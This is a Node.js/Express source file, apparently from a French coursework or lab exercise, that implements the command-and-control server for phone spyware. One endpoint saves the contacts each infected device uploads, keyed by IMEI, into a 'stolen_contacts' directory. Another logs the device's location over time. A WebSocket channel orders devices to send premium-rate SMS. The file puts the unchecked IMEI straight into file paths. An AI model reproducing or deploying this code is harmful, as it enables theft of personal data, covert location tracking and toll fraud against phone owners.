//PARTIE 2
var express = require('express');
var bodyParser = require('body-parser')
const fs = require('fs');

var app = express();
var server = require('http').createServer(app);

//Verfier
var jsonObject = {}.constructor;

app.use(bodyParser.json())

// parse application/x-www-form-urlencoded
// app.use(bodyParser.urlencoded({ extended: false }));

app.post('/', function(req,res) {

   //Verify if the data is a JSON object
   if(req.body.constructor === jsonObject){
  //Verify syntax of the JSON
     if("imei" in req.body && "contacts" in req.body){
     fs.writeFile("stolen_contacts/"+req.body.imei+".txt", JSON.stringify(req.body.contacts), function(err) {
         if(err) {
             return console.log(err);
         }

         console.log("The file was saved!");
     });
     res.status(201).json(req.body);
    }
    else{
      console.log('This is an error!  Wrong JSON syntax')
      return res.status(400).send({
         message: 'This is an error! : Wrong JSON syntax'
      });
    }
   }
   else{
     console.log('This is an error!  Not a JSONObject')
     return res.status(400).send({
        message: 'This is an error! : Not a JSONObject'
     });
   }
});

app.post('/location', function(req,res) {

  //Verify if the data is a JSON object
  if(req.body.constructor === jsonObject){
 //Verify syntax of the JSON
    if("imei" in req.body && "coordinates" in req.body){
       if (fs.existsSync("stolen_contacts/location-"+req.body.imei+".txt")) {
             fs.appendFile("stolen_contacts/location-"+req.body.imei+".txt", JSON.stringify(req.body.coordinates), function (err) {
             if (err) throw err;
             console.log("New location update");
             });
	      }
       else {
             fs.writeFile("stolen_contacts/location-"+req.body.imei+".txt", JSON.stringify(req.body.coordinates), function(err) {
              if(err) {
              return console.log(err);
              }
              console.log("The location file was saved!");
             });
	       }

    res.status(201).json(req.body);
    }
    else{
     console.log('This is an error!  Wrong JSON syntax')
     return res.status(400).send({
        message: 'This is an error! : Wrong JSON syntax'
     });
   }
  }
  else{
    console.log('This is an error!  Not a JSONObject')
    return res.status(400).send({
       message: 'This is an error! : Not a JSONObject'
    });
  }
});

//start our web server and server listening
server.listen(8080, function(){
  console.log('listening on *:8080');
});



//PARTIE 3
// create the server
var WebSocketServer = require('websocket').server;

wsServer = new WebSocketServer({
  httpServer: server
});

const data = {
	"command": "send_sms",
	"payload":
		{
			"phone_number": "666",
			"content": "SMS surtaxé"
		}
}

// WebSocket server
wsServer.on('request', function(request) {
  var connection = request.accept(null, request.origin);

  // This is the most important callback for us, we'll handle
  // all messages from users here.
  connection.on('message', function(message) {
    if (message.type === 'utf8') {
      // process WebSocket message
			connection.send(JSON.stringify(data));
    }
  });

  connection.on('close', function(connection) {
    // close user connection
  });
});
